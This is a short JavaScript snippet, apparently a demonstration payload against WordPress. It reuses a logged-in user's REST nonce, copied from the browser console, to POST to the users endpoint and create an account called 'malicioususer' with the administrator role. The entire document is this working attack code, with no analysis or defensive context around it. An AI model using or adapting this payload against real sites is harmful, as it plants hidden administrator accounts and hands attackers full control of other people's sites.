/**
 * Get the current nonce for authentication.
 *
 * @return string The current WordPress nonce.
 */
function getNonce() {
  // This will ONLY work on my machine.
  // During development we are returning a hardcoded nonce.
  // I got this value by running 'wpApiSettings.nonce' in the browser console
  // while on a backend editor page.
  return 'b1772887b9';
}

const endPoint = '/wp-json/wp/v2/users';
const fetchOptions = {
  method: 'POST',
  credentials: 'same-origin',
  headers: {
    'X-WP-Nonce': 'b1772887b9',
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    username: 'malicioususer',
    email: 'malicioususer@example.com',
    password: 'iambad',
    roles: 'administrator',
  })
};
fetch(endPoint, fetchOptions)
  .then((response) => {
    console.log({response});
    return response.json();
  })
  .then((data) => {
    console.log({data});
  });
